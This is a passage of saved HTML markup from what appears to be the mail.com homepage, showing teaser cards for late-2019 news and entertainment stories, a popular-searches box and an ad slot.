    <a href="https://www.mail.com/int/entertainment/music/9612260-ap-exclusive-amy-winehouse-exhibit-to-open-grammy.html#.1258-stage-set2-3" target="_top"><div class="teaser-wrapper">
    <div class="teaser-image">
        <figure class="mod mod-image" data-init="true"><span data-picture="" data-alt="" data-src="https://i0.mail.com/mcom/734/9612734,pd=3,f=teaser-card-s/.jpg" data-srcset="https://i0.mail.com/mcom/734/9612734%2Cpd=3%2Cf=teaser-card-s/.jpg 300w, https://i0.mail.com/mcom/734/9612734%2Cpd=3%2Cf=teaser-card-m/.jpg 460w, https://i0.mail.com/mcom/734/9612734%2Cpd=3%2Cf=teaser-card-l/.jpg 620w, https://i0.mail.com/mcom/734/9612734%2Cpd=3%2Cf=teaser-card-xl/.jpg 940w" data-sizes="(max-width:479px) 100vw, (min-width:480px) and (max-width:767px) 460px, (min-width:768px) and (max-width:1023px) 460px, (min-width:1024px) 460px">
<noscript>
<img alt="" crossorigin="anonymous" src="https://i0.mail.com/mcom/734/9612734,pd=3,f=teaser-card-s/.jpg" srcset="https://i0.mail.com/mcom/734/9612734%2Cpd=3%2Cf=teaser-card-s/.jpg 300w, https://i0.mail.com/mcom/734/9612734%2Cpd=3%2Cf=teaser-card-m/.jpg 460w, https://i0.mail.com/mcom/734/9612734%2Cpd=3%2Cf=teaser-card-l/.jpg 620w, https://i0.mail.com/mcom/734/9612734%2Cpd=3%2Cf=teaser-card-xl/.jpg 940w" sizes="(max-width:479px) 100vw, (min-width:480px) and (max-width:767px) 460px, (min-width:768px) and (max-width:1023px) 460px, (min-width:1024px) 460px" />
</noscript><img alt="" crossorigin="anonymous" data-src="https://i0.mail.com/mcom/734/9612734,pd=3,f=teaser-card-s/.jpg" data-srcset="https://i0.mail.com/mcom/734/9612734%2Cpd=3%2Cf=teaser-card-s/.jpg 300w, https://i0.mail.com/mcom/734/9612734%2Cpd=3%2Cf=teaser-card-m/.jpg 460w, https://i0.mail.com/mcom/734/9612734%2Cpd=3%2Cf=teaser-card-l/.jpg 620w, https://i0.mail.com/mcom/734/9612734%2Cpd=3%2Cf=teaser-card-xl/.jpg 940w" data-sizes="(max-width:479px) 100vw, (min-width:480px) and (max-width:767px) 460px, (min-width:768px) and (max-width:1023px) 460px, (min-width:1024px) 460px" class="lazyImg" srcset="https://i0.mail.com/mcom/734/9612734%2Cpd=3%2Cf=teaser-card-s/.jpg 300w, https://i0.mail.com/mcom/734/9612734%2Cpd=3%2Cf=teaser-card-m/.jpg 460w, https://i0.mail.com/mcom/734/9612734%2Cpd=3%2Cf=teaser-card-l/.jpg 620w, https://i0.mail.com/mcom/734/9612734%2Cpd=3%2Cf=teaser-card-xl/.jpg 940w" sizes="(max-width:479px) 100vw, (min-width:480px) and (max-width:767px) 460px, (min-width:768px) and (max-width:1023px) 460px, (min-width:1024px) 460px" src="files/jpg(11)"></span></figure><div class="stripe"></div>
      </div>
      <div class="teaser-text">
      <span class="teaser-label">
        Music</span>
        <div class="teaser-headline">AP Exclusive: Amy Winehouse exhibit to open at Grammy Museum</div>
</div>
    </div>
</a></div>
</div>
    <div class="block">
        <div class="mod mod-teaser teaser-card" data-theme="entertainment" data-init="true">
    <a href="https://www.mail.com/int/entertainment/celebrity/9612094-showbiz-minute-tekashi-6ix9ine-cabello-star-wars.html#.1258-stage-set2-4" target="_top"><div class="teaser-wrapper">
    <div class="teaser-image">
        <figure class="mod mod-image" data-init="true"><span data-picture="" data-alt="Preview Image" data-src="https://i0.mail.com/mcom/096/9612096,pd=1,f=teaser-card-s/preview-image.jpg" data-srcset="https://i0.mail.com/mcom/096/9612096%2Cpd=1%2Cf=teaser-card-s/preview-image.jpg 300w, https://i0.mail.com/mcom/096/9612096%2Cpd=1%2Cf=teaser-card-m/preview-image.jpg 460w, https://i0.mail.com/mcom/096/9612096%2Cpd=1%2Cf=teaser-card-l/preview-image.jpg 620w, https://i0.mail.com/mcom/096/9612096%2Cpd=1%2Cf=teaser-card-xl/preview-image.jpg 940w" data-sizes="(max-width:479px) 100vw, (min-width:480px) and (max-width:767px) 460px, (min-width:768px) and (max-width:1023px) 300px, (min-width:1024px) 300px">
<noscript>
<img alt="Preview Image" crossorigin="anonymous" src="https://i0.mail.com/mcom/096/9612096,pd=1,f=teaser-card-s/preview-image.jpg" srcset="https://i0.mail.com/mcom/096/9612096%2Cpd=1%2Cf=teaser-card-s/preview-image.jpg 300w, https://i0.mail.com/mcom/096/9612096%2Cpd=1%2Cf=teaser-card-m/preview-image.jpg 460w, https://i0.mail.com/mcom/096/9612096%2Cpd=1%2Cf=teaser-card-l/preview-image.jpg 620w, https://i0.mail.com/mcom/096/9612096%2Cpd=1%2Cf=teaser-card-xl/preview-image.jpg 940w" sizes="(max-width:479px) 100vw, (min-width:480px) and (max-width:767px) 460px, (min-width:768px) and (max-width:1023px) 300px, (min-width:1024px) 300px" />
</noscript><img alt="Preview Image" crossorigin="anonymous" data-src="https://i0.mail.com/mcom/096/9612096,pd=1,f=teaser-card-s/preview-image.jpg" data-srcset="https://i0.mail.com/mcom/096/9612096%2Cpd=1%2Cf=teaser-card-s/preview-image.jpg 300w, https://i0.mail.com/mcom/096/9612096%2Cpd=1%2Cf=teaser-card-m/preview-image.jpg 460w, https://i0.mail.com/mcom/096/9612096%2Cpd=1%2Cf=teaser-card-l/preview-image.jpg 620w, https://i0.mail.com/mcom/096/9612096%2Cpd=1%2Cf=teaser-card-xl/preview-image.jpg 940w" data-sizes="(max-width:479px) 100vw, (min-width:480px) and (max-width:767px) 460px, (min-width:768px) and (max-width:1023px) 300px, (min-width:1024px) 300px" class="lazyImg" srcset="https://i0.mail.com/mcom/096/9612096%2Cpd=1%2Cf=teaser-card-s/preview-image.jpg 300w, https://i0.mail.com/mcom/096/9612096%2Cpd=1%2Cf=teaser-card-m/preview-image.jpg 460w, https://i0.mail.com/mcom/096/9612096%2Cpd=1%2Cf=teaser-card-l/preview-image.jpg 620w, https://i0.mail.com/mcom/096/9612096%2Cpd=1%2Cf=teaser-card-xl/preview-image.jpg 940w" sizes="(max-width:479px) 100vw, (min-width:480px) and (max-width:767px) 460px, (min-width:768px) and (max-width:1023px) 300px, (min-width:1024px) 300px" src="files/preview-image(1).jpg"></span></figure><span class="teaser-overlay overlay-video"></span><div class="stripe"></div>
      </div>
      <div class="teaser-text">
      <span class="teaser-label">
        Celebrity</span>
        <div class="teaser-headline">ShowBiz Minute: Tekashi 6ix9ine, Cabello, 'Star Wars'</div>
</div>
    </div>
</a></div>
</div>
    <div class="block">
        <div class="mod mod-teaser teaser-card" data-theme="entertainment" data-init="true">
    <a href="https://www.mail.com/int/entertainment/celebrity/9612010-ap-breakthrough-entertainer-jonathan-majors.html#.1258-stage-set2-5" target="_top"><div class="teaser-wrapper">
    <div class="teaser-image">
        <figure class="mod mod-image" data-init="true"><span data-picture="" data-alt="Preview Image" data-src="https://i0.mail.com/mcom/012/9612012,pd=1,f=teaser-card-s/preview-image.jpg" data-srcset="https://i0.mail.com/mcom/012/9612012%2Cpd=1%2Cf=teaser-card-s/preview-image.jpg 300w, https://i0.mail.com/mcom/012/9612012%2Cpd=1%2Cf=teaser-card-m/preview-image.jpg 460w, https://i0.mail.com/mcom/012/9612012%2Cpd=1%2Cf=teaser-card-l/preview-image.jpg 620w, https://i0.mail.com/mcom/012/9612012%2Cpd=1%2Cf=teaser-card-xl/preview-image.jpg 940w" data-sizes="(max-width:479px) 100vw, (min-width:480px) and (max-width:767px) 460px, (min-width:768px) and (max-width:1023px) 300px, (min-width:1024px) 300px">
<noscript>
<img alt="Preview Image" crossorigin="anonymous" src="https://i0.mail.com/mcom/012/9612012,pd=1,f=teaser-card-s/preview-image.jpg" srcset="https://i0.mail.com/mcom/012/9612012%2Cpd=1%2Cf=teaser-card-s/preview-image.jpg 300w, https://i0.mail.com/mcom/012/9612012%2Cpd=1%2Cf=teaser-card-m/preview-image.jpg 460w, https://i0.mail.com/mcom/012/9612012%2Cpd=1%2Cf=teaser-card-l/preview-image.jpg 620w, https://i0.mail.com/mcom/012/9612012%2Cpd=1%2Cf=teaser-card-xl/preview-image.jpg 940w" sizes="(max-width:479px) 100vw, (min-width:480px) and (max-width:767px) 460px, (min-width:768px) and (max-width:1023px) 300px, (min-width:1024px) 300px" />
</noscript><img alt="Preview Image" crossorigin="anonymous" data-src="https://i0.mail.com/mcom/012/9612012,pd=1,f=teaser-card-s/preview-image.jpg" data-srcset="https://i0.mail.com/mcom/012/9612012%2Cpd=1%2Cf=teaser-card-s/preview-image.jpg 300w, https://i0.mail.com/mcom/012/9612012%2Cpd=1%2Cf=teaser-card-m/preview-image.jpg 460w, https://i0.mail.com/mcom/012/9612012%2Cpd=1%2Cf=teaser-card-l/preview-image.jpg 620w, https://i0.mail.com/mcom/012/9612012%2Cpd=1%2Cf=teaser-card-xl/preview-image.jpg 940w" data-sizes="(max-width:479px) 100vw, (min-width:480px) and (max-width:767px) 460px, (min-width:768px) and (max-width:1023px) 300px, (min-width:1024px) 300px" class="lazyImg" srcset="https://i0.mail.com/mcom/012/9612012%2Cpd=1%2Cf=teaser-card-s/preview-image.jpg 300w, https://i0.mail.com/mcom/012/9612012%2Cpd=1%2Cf=teaser-card-m/preview-image.jpg 460w, https://i0.mail.com/mcom/012/9612012%2Cpd=1%2Cf=teaser-card-l/preview-image.jpg 620w, https://i0.mail.com/mcom/012/9612012%2Cpd=1%2Cf=teaser-card-xl/preview-image.jpg 940w" sizes="(max-width:479px) 100vw, (min-width:480px) and (max-width:767px) 460px, (min-width:768px) and (max-width:1023px) 300px, (min-width:1024px) 300px" src="files/preview-image(2).jpg"></span></figure><span class="teaser-overlay overlay-video"></span><div class="stripe"></div>
      </div>
      <div class="teaser-text">
      <span class="teaser-label">
        Celebrity</span>
        <div class="teaser-headline">AP Breakthrough Entertainer: Jonathan Majors</div>
</div>
    </div>
</a></div>
</div>
    <div class="block">
        <div class="mod mod-teaser teaser-card" data-theme="entertainment" data-init="true">
    <a href="https://www.mail.com/int/entertainment/celebrity/9610318-slavery-museum-liverpool-aims-to-confront-painful.html#.1258-stage-set2-6" target="_top"><div class="teaser-wrapper">
    <div class="teaser-image">
        <figure class="mod mod-image" data-init="true"><span data-picture="" data-alt="" data-src="https://i0.mail.com/mcom/320/9610320,pd=1,f=teaser-card-s/.jpg" data-srcset="https://i0.mail.com/mcom/320/9610320%2Cpd=1%2Cf=teaser-card-s/.jpg 300w, https://i0.mail.com/mcom/320/9610320%2Cpd=1%2Cf=teaser-card-m/.jpg 460w, https://i0.mail.com/mcom/320/9610320%2Cpd=1%2Cf=teaser-card-l/.jpg 620w, https://i0.mail.com/mcom/320/9610320%2Cpd=1%2Cf=teaser-card-xl/.jpg 940w" data-sizes="(max-width:479px) 100vw, (min-width:480px) and (max-width:767px) 460px, (min-width:768px) and (max-width:1023px) 300px, (min-width:1024px) 300px">
<noscript>
<img alt="" crossorigin="anonymous" src="https://i0.mail.com/mcom/320/9610320,pd=1,f=teaser-card-s/.jpg" srcset="https://i0.mail.com/mcom/320/9610320%2Cpd=1%2Cf=teaser-card-s/.jpg 300w, https://i0.mail.com/mcom/320/9610320%2Cpd=1%2Cf=teaser-card-m/.jpg 460w, https://i0.mail.com/mcom/320/9610320%2Cpd=1%2Cf=teaser-card-l/.jpg 620w, https://i0.mail.com/mcom/320/9610320%2Cpd=1%2Cf=teaser-card-xl/.jpg 940w" sizes="(max-width:479px) 100vw, (min-width:480px) and (max-width:767px) 460px, (min-width:768px) and (max-width:1023px) 300px, (min-width:1024px) 300px" />
</noscript><img alt="" crossorigin="anonymous" data-src="https://i0.mail.com/mcom/320/9610320,pd=1,f=teaser-card-s/.jpg" data-srcset="https://i0.mail.com/mcom/320/9610320%2Cpd=1%2Cf=teaser-card-s/.jpg 300w, https://i0.mail.com/mcom/320/9610320%2Cpd=1%2Cf=teaser-card-m/.jpg 460w, https://i0.mail.com/mcom/320/9610320%2Cpd=1%2Cf=teaser-card-l/.jpg 620w, https://i0.mail.com/mcom/320/9610320%2Cpd=1%2Cf=teaser-card-xl/.jpg 940w" data-sizes="(max-width:479px) 100vw, (min-width:480px) and (max-width:767px) 460px, (min-width:768px) and (max-width:1023px) 300px, (min-width:1024px) 300px" class="lazyImg" srcset="https://i0.mail.com/mcom/320/9610320%2Cpd=1%2Cf=teaser-card-s/.jpg 300w, https://i0.mail.com/mcom/320/9610320%2Cpd=1%2Cf=teaser-card-m/.jpg 460w, https://i0.mail.com/mcom/320/9610320%2Cpd=1%2Cf=teaser-card-l/.jpg 620w, https://i0.mail.com/mcom/320/9610320%2Cpd=1%2Cf=teaser-card-xl/.jpg 940w" sizes="(max-width:479px) 100vw, (min-width:480px) and (max-width:767px) 460px, (min-width:768px) and (max-width:1023px) 300px, (min-width:1024px) 300px" src="files/jpg(12)"></span></figure><div class="stripe"></div>
      </div>
      <div class="teaser-text">
      <span class="teaser-label">
        Celebrity</span>
        <div class="teaser-headline">Slavery museum in Liverpool aims to confront painful legacy</div>
</div>
    </div>
</a></div>
</div>
    <div class="block">
        <div class="mod mod-teaser teaser-card" data-theme="entertainment" data-init="true">
    <a href="https://www.mail.com/int/entertainment/lifestyle/9609108-review-rise-skywalker-sour-to-grand-saga.html#.1258-stage-set2-7" target="_top"><div class="teaser-wrapper">
    <div class="teaser-image">
        <figure class="mod mod-image" data-init="true"><span data-picture="" data-alt="" data-src="https://i0.mail.com/mcom/092/9609092,pd=3,f=teaser-card-s/.jpg" data-srcset="https://i0.mail.com/mcom/092/9609092%2Cpd=3%2Cf=teaser-card-s/.jpg 300w, https://i0.mail.com/mcom/092/9609092%2Cpd=3%2Cf=teaser-card-m/.jpg 460w, https://i0.mail.com/mcom/092/9609092%2Cpd=3%2Cf=teaser-card-l/.jpg 620w, https://i0.mail.com/mcom/092/9609092%2Cpd=3%2Cf=teaser-card-xl/.jpg 940w" data-sizes="(max-width:479px) 100vw, (min-width:480px) and (max-width:767px) 460px, (min-width:768px) and (max-width:1023px) 300px, (min-width:1024px) 300px">
<noscript>
<img alt="" crossorigin="anonymous" src="https://i0.mail.com/mcom/092/9609092,pd=3,f=teaser-card-s/.jpg" srcset="https://i0.mail.com/mcom/092/9609092%2Cpd=3%2Cf=teaser-card-s/.jpg 300w, https://i0.mail.com/mcom/092/9609092%2Cpd=3%2Cf=teaser-card-m/.jpg 460w, https://i0.mail.com/mcom/092/9609092%2Cpd=3%2Cf=teaser-card-l/.jpg 620w, https://i0.mail.com/mcom/092/9609092%2Cpd=3%2Cf=teaser-card-xl/.jpg 940w" sizes="(max-width:479px) 100vw, (min-width:480px) and (max-width:767px) 460px, (min-width:768px) and (max-width:1023px) 300px, (min-width:1024px) 300px" />
</noscript><img alt="" crossorigin="anonymous" data-src="https://i0.mail.com/mcom/092/9609092,pd=3,f=teaser-card-s/.jpg" data-srcset="https://i0.mail.com/mcom/092/9609092%2Cpd=3%2Cf=teaser-card-s/.jpg 300w, https://i0.mail.com/mcom/092/9609092%2Cpd=3%2Cf=teaser-card-m/.jpg 460w, https://i0.mail.com/mcom/092/9609092%2Cpd=3%2Cf=teaser-card-l/.jpg 620w, https://i0.mail.com/mcom/092/9609092%2Cpd=3%2Cf=teaser-card-xl/.jpg 940w" data-sizes="(max-width:479px) 100vw, (min-width:480px) and (max-width:767px) 460px, (min-width:768px) and (max-width:1023px) 300px, (min-width:1024px) 300px" class="lazyImg" srcset="https://i0.mail.com/mcom/092/9609092%2Cpd=3%2Cf=teaser-card-s/.jpg 300w, https://i0.mail.com/mcom/092/9609092%2Cpd=3%2Cf=teaser-card-m/.jpg 460w, https://i0.mail.com/mcom/092/9609092%2Cpd=3%2Cf=teaser-card-l/.jpg 620w, https://i0.mail.com/mcom/092/9609092%2Cpd=3%2Cf=teaser-card-xl/.jpg 940w" sizes="(max-width:479px) 100vw, (min-width:480px) and (max-width:767px) 460px, (min-width:768px) and (max-width:1023px) 300px, (min-width:1024px) 300px" src="files/jpg(13)"></span></figure><div class="stripe"></div>
      </div>
      <div class="teaser-text">
      <span class="teaser-label">
        Lifestyle</span>
        <div class="teaser-headline">Review: 'Rise of Skywalker' is a sour end to a grand saga</div>
</div>
    </div>
</a></div>
</div>
    </div>
</div>
<div class="mod-container">
    <div class="blocks blocks-3">
    <div class="block">
        <div class="mod mod-tool" data-theme="mixed" data-init="true">
  <div class="searchtips">
    <div class="hl-big">Popular Searches</div>
    <div class="hl-small">Lifestyle</div>
    <ul class="searches">
      <li><a class="w4" href="https://search.mail.com/web/result?fq=Lifestyle&amp;rq=Daily+Lenses&amp;q=Daily+Lenses&amp;origin=onsite">Daily Lenses</a></li>
    <li><a class="w1" href="https://search.mail.com/web/result?fq=Lifestyle&amp;rq=Best+Vegetable+Delivery+Service&amp;q=Best+Vegetable+Delivery+Service&amp;origin=onsite">Best Vegetable Delivery Service</a></li>
    <li><a class="w3" href="https://search.mail.com/web/result?fq=Lifestyle&amp;rq=Solar+Voltaic+Installers&amp;q=Solar+Voltaic+Installers&amp;origin=onsite">Solar Voltaic Installers</a></li>
    <li><a class="w1" href="https://search.mail.com/web/result?fq=Lifestyle&amp;rq=Christmas+Cards+Online&amp;q=Christmas+Cards+Online&amp;origin=onsite">Christmas Cards Online</a></li>
    <li><a class="w2" href="https://search.mail.com/web/result?fq=Lifestyle&amp;rq=Personalised+Shampoo&amp;q=Personalised+Shampoo&amp;origin=onsite">Personalised Shampoo</a></li>
    </ul>
  </div>
</div></div>
    <div class="block">
        </div>
    <div class="block">
        <div class="ad-container ad-content mod mod-inviewcheck" id="gpt-medrec1" data-init="true" data-adcalled="true" data-google-query-id="CPye9uOrwuYCFVnHuwgdNlsNiQ">
  
<div id="google_ads_iframe_/6840/p6840.mail.com/HomePage_3__container__" style="border: 0pt none; display: inline-block; width: 300px; height: 250px;"><iframe frameborder="0" src="files/container(1).html" id="google_ads_iframe_/6840/p6840.mail.com/HomePage_3" title="3rd party ad content" name="" scrolling="no" marginwidth="0" marginheight="0" width="300" height="250" data-is-safeframe="true" sandbox="allow-forms allow-pointer-lock allow-popups allow-popups-to-escape-sandbox allow-same-origin allow-scripts allow-top-navigation-by-user-activation" data-google-container-id="5" style="border: 0px; vertical-align: bottom;" data-load-complete="true"></iframe></div></div></div>
    </div>
</div>
<div class="mod-container">
    <div class="container-headline" data-theme="mixed">
    <span>Newest videos</span>
  </div>
<div class="blocks blocks-3">
    <div class="block">
        <div class="mod mod-teaser teaser-card" data-theme="news" data-init="true">
    <a href="https://www.mail.com/int/news/world/9612940-pelosi-trumps-dingell-slam-cruelty-wit.html#.1258-stage-mm2s1-1" target="_top"><div class="teaser-wrapper">
    <div class="teaser-image">
        <figure class="mod mod-image" data-init="true"><span data-picture="" data-alt="Preview Image" data-src="https://i0.mail.com/mcom/942/9612942,pd=1,f=teaser-card-s/preview-image.jpg" data-srcset="https://i0.mail.com/mcom/942/9612942%2Cpd=1%2Cf=teaser-card-s/preview-image.jpg 300w, https://i0.mail.com/mcom/942/9612942%2Cpd=1%2Cf=teaser-card-m/preview-image.jpg 460w, https://i0.mail.com/mcom/942/9612942%2Cpd=1%2Cf=teaser-card-l/preview-image.jpg 620w, https://i0.mail.com/mcom/942/9612942%2Cpd=1%2Cf=teaser-card-xl/preview-image.jpg 940w" data-sizes="(max-width:479px) 100vw, (min-width:480px) and (max-width:767px) 460px, (min-width:768px) and (max-width:1023px) 460px, (min-width:1024px) 300px">
<noscript>
<img alt="Preview Image" crossorigin="anonymous" src="https://i0.mail.com/mcom/942/9612942,pd=1,f=teaser-card-s/preview-image.jpg" srcset="https://i0.mail.com/mcom/942/9612942%2Cpd=1%2Cf=teaser-card-s/preview-image.jpg 300w, https://i0.mail.com/mcom/942/9612942%2Cpd=1%2Cf=teaser-card-m/preview-image.jpg 460w, https://i0.mail.com/mcom/942/9612942%2Cpd=1%2Cf=teaser-card-l/preview-image.jpg 620w, https://i0.mail.com/mcom/942/9612942%2Cpd=1%2Cf=teaser-card-xl/preview-image.jpg 940w" sizes="(max-width:479px) 100vw, (min-width:480px) and (max-width:767px) 460px, (min-width:768px) and (max-width:1023px) 460px, (min-width:1024px) 300px" />
</noscript><img alt="Preview Image" crossorigin="anonymous" data-src="https://i0.mail.com/mcom/942/9612942,pd=1,f=teaser-card-s/preview-image.jpg" data-srcset="https://i0.mail.com/mcom/942/9612942%2Cpd=1%2Cf=teaser-card-s/preview-image.jpg 300w, https://i0.mail.com/mcom/942/9612942%2Cpd=1%2Cf=teaser-card-m/preview-image.jpg 460w, https://i0.mail.com/mcom/942/9612942%2Cpd=1%2Cf=teaser-card-l/preview-image.jpg 620w, https://i0.mail.com/mcom/942/9612942%2Cpd=1%2Cf=teaser-card-xl/preview-image.jpg 940w" data-sizes="(max-width:479px) 100vw, (min-width:480px) and (max-width:767px) 460px, (min-width:768px) and (max-width:1023px) 460px, (min-width:1024px) 300px" class="lazyImg" srcset="https://i0.mail.com/mcom/942/9612942%2Cpd=1%2Cf=teaser-card-s/preview-image.jpg 300w, https://i0.mail.com/mcom/942/9612942%2Cpd=1%2Cf=teaser-card-m/preview-image.jpg 460w, https://i0.mail.com/mcom/942/9612942%2Cpd=1%2Cf=teaser-card-l/preview-image.jpg 620w, https://i0.mail.com/mcom/942/9612942%2Cpd=1%2Cf=teaser-card-xl/preview-image.jpg 940w" sizes="(max-width:479px) 100vw, (min-width:480px) and (max-width:767px) 460px, (min-width:768px) and (max-width:1023px) 460px, (min-width:1024px) 300px" src="files/preview-image.jpg"></span></figure><span class="teaser-overlay overlay-video"></span><div class="stripe"></div>
      </div>
      <div class="teaser-text">
      <span class="teaser-label">
        World</span>
        <div class="teaser-headline">Pelosi on Trump's Dingell slam: Cruelty is not wit</div>
</div>
    </div>
</a></div>
</div>
    <div class="block">
        <div class="mod mod-teaser teaser-card" data-theme="entertainment" data-init="true">
    <a href="https://www.mail.com/int/entertainment/celebrity/9612094-showbiz-minute-tekashi-6ix9ine-cabello-star-wars.html#.1258-stage-mm2s1-2" target="_top"><div class="teaser-wrapper">
    <div class="teaser-image">
        <figure class="mod mod-image" data-init="true"><span data-picture="" data-alt="Preview Image" data-src="https://i0.mail.com/mcom/096/9612096,pd=1,f=teaser-card-s/preview-image.jpg" data-srcset="https://i0.mail.com/mcom/096/9612096%2Cpd=1%2Cf=teaser-card-s/preview-image.jpg 300w, https://i0.mail.com/mcom/096/9612096%2Cpd=1%2Cf=teaser-card-m/preview-image.jpg 460w, https://i0.mail.com/mcom/096/9612096%2Cpd=1%2Cf=teaser-card-l/preview-image.jpg 620w, https://i0.mail.com/mcom/096/9612096%2Cpd=1%2Cf=teaser-card-xl/preview-image.jpg 940w" data-sizes="(max-width:479px) 100vw, (min-width:480px) and (max-width:767px) 460px, (min-width:768px) and (max-width:1023px) 300px, (min-width:1024px) 300px">
<noscript>
<img alt="Preview Image" crossorigin="anonymous" src="https://i0.mail.com/mcom/096/9612096,pd=1,f=teaser-card-s/preview-image.jpg" srcset="https://i0.mail.com/mcom/096/9612096%2Cpd=1%2Cf=teaser-card-s/preview-image.jpg 300w, https://i0.mail.com/mcom/096/9612096%2Cpd=1%2Cf=teaser-card-m/preview-image.jpg 460w, https://i0.mail.com/mcom/096/9612096%2Cpd=1%2Cf=teaser-card-l/preview-image.jpg 620w, https://i0.mail.com/mcom/096/9612096%2Cpd=1%2Cf=teaser-card-xl/preview-image.jpg 940w" sizes="(max-width:479px) 100vw, (min-width:480px) and (max-width:767px) 460px, (min-width:768px) and (max-width:1023px) 300px, (min-width:1024px) 300px" />
</noscript><img alt="Preview Image" crossorigin="anonymous" data-src="https://i0.mail.com/mcom/096/9612096,pd=1,f=teaser-card-s/preview-image.jpg" data-srcset="https://i0.mail.com/mcom/096/9612096%2Cpd=1%2Cf=teaser-card-s/preview-image.jpg 300w, https://i0.mail.com/mcom/096/9612096%2Cpd=1%2Cf=teaser-card-m/preview-image.jpg 460w, https://i0.mail.com/mcom/096/9612096%2Cpd=1%2Cf=teaser-card-l/preview-image.jpg 620w, https://i0.mail.com/mcom/096/9612096%2Cpd=1%2Cf=teaser-card-xl/preview-image.jpg 940w" data-sizes="(max-width:479px) 100vw, (min-width:480px) and (max-width:767px) 460px, (min-width:768px) and (max-width:1023px) 300px, (min-width:1024px) 300px" class="lazyImg" srcset="https://i0.mail.com/mcom/096/9612096%2Cpd=1%2Cf=teaser-card-s/preview-image.jpg 300w, https://i0.mail.com/mcom/096/9612096%2Cpd=1%2Cf=teaser-card-m/preview-image.jpg 460w, https://i0.mail.com/mcom/096/9612096%2Cpd=1%2Cf=teaser-card-l/preview-image.jpg 620w, https://i0.mail.com/mcom/096/9612096%2Cpd=1%2Cf=teaser-card-xl/preview-image.jpg 940w" sizes="(max-width:479px) 100vw, (min-width:480px) and (max-width:767px) 460px, (min-width:768px) and (max-width:1023px) 300px, (min-width:1024px) 300px" src="files/preview-image(1).jpg"></span></figure><span class="teaser-overlay overlay-video"></span><div class="stripe"></div>
      </div>
      <div class="teaser-text">
      <span class="teaser-label">
        Celebrity</span>
        <div class="teaser-headline">ShowBiz Minute: Tekashi 6ix9ine, Cabello, 'Star Wars'</div>
</div>
    </div>
</a></div>
</div>
    <div class="block">
      <div class="mod mod-teaser teaser-list" data-theme="entertainment" data-init="true">
    <a href="https://www.mail.com/int/entertainment/celebrity/9612010-ap-breakthrough-entertainer-jonathan-majors.html#.1258-stage-mm2s1-3" target="_top"><div class="teaser-wrapper">
    <div class="teaser-image">
        <figure class="mod mod-image" data-init="true"><span data-picture="" data-alt="Preview Image" data-src="https://i0.mail.com/mcom/012/9612012,pd=1,f=teaser-list-s/preview-image.jpg" data-srcset="https://i0.mail.com/mcom/012/9612012%2Cpd=1%2Cf=teaser-list-s/preview-image.jpg 120w, https://i0.mail.com/mcom/012/9612012%2Cpd=1%2Cf=teaser-list-l/preview-image.jpg 240w" data-sizes="(max-width:479px) 120px, (min-width:480px) and (max-width:767px) 120px, (min-width:768px) and (max-width:1023px) 120px, (min-width:1024px) 120px">
<noscript>
<img alt="Preview Image" crossorigin="anonymous" src="https://i0.mail.com/mcom/012/9612012,pd=1,f=teaser-list-s/preview-image.jpg" srcset="https://i0.mail.com/mcom/012/9612012%2Cpd=1%2Cf=teaser-list-s/preview-image.jpg 120w, https://i0.mail.com/mcom/012/9612012%2Cpd=1%2Cf=teaser-list-l/preview-image.jpg 240w" sizes="(max-width:479px) 120px, (min-width:480px) and (max-width:767px) 120px, (min-width:768px) and (max-width:1023px) 120px, (min-width:1024px) 120px" />
</noscript><img alt="Preview Image" crossorigin="anonymous" data-src="https://i0.mail.com/mcom/012/9612012,pd=1,f=teaser-list-s/preview-image.jpg" data-srcset="https://i0.mail.com/mcom/012/9612012%2Cpd=1%2Cf=teaser-list-s/preview-image.jpg 120w, https://i0.mail.com/mcom/012/9612012%2Cpd=1%2Cf=teaser-list-l/preview-image.jpg 240w" data-sizes="(max-width:479px) 120px, (min-width:480px) and (max-width:767px) 120px, (min-width:768px) and (max-width:1023px) 120px, (min-width:1024px) 120px" class="lazyImg" srcset="https://i0.mail.com/mcom/012/9612012%2Cpd=1%2Cf=teaser-list-s/preview-image.jpg 120w, https://i0.mail.com/mcom/012/9612012%2Cpd=1%2Cf=teaser-list-l/preview-image.jpg 240w" sizes="(max-width:479px) 120px, (min-width:480px) and (max-width:767px) 120px, (min-width:768px) and (max-width:1023px) 120px, (min-width:1024px) 120px" src="files/preview-image(3).jpg"></span></figure><span class="teaser-overlay overlay-video"></span><div class="stripe"></div>
      </div>
      <div class="teaser-text">
      <span class="teaser-label">
        Celebrity</span>
        <div class="teaser-headline">AP Breakthrough Entertainer: Jonathan Majors</div>
</div>
    </div>
</a></div>
<div class="mod mod-teaser teaser-list" data-theme="news" data-init="true">
    <a href="https://www.mail.com/int/news/world/9610950-impeachment-views-split-party-lines.html#.1258-stage-mm2s1-4" target="_top"><div class="teaser-wrapper">
    <div class="teaser-image">
        <figure class="mod mod-image" data-init="true"><span data-picture="" data-alt="Preview Image" data-src="https://i0.mail.com/mcom/952/9610952,pd=1,f=teaser-list-s/preview-image.jpg" data-srcset="https://i0.mail.com/mcom/952/9610952%2Cpd=1%2Cf=teaser-list-s/preview-image.jpg 120w, https://i0.mail.com/mcom/952/9610952%2Cpd=1%2Cf=teaser-list-l/preview-image.jpg 240w" data-sizes="(max-width:479px) 120px, (min-width:480px) and (max-width:767px) 120px, (min-width:768px) and (max-width:1023px) 120px, (min-width:1024px) 120px">
<noscript>
<img alt="Preview Image" crossorigin="anonymous" src="https://i0.mail.com/mcom/952/9610952,pd=1,f=teaser-list-s/preview-image.jpg" srcset="https://i0.mail.com/mcom/952/9610952%2Cpd=1%2Cf=teaser-list-s/preview-image.jpg 120w, https://i0.mail.com/mcom/952/9610952%2Cpd=1%2Cf=teaser-list-l/preview-image.jpg 240w" sizes="(max-width:479px) 120px, (min-width:480px) and (max-width:767px) 120px, (min-width:768px) and (max-width:1023px) 120px, (min-width:1024px) 120px" />
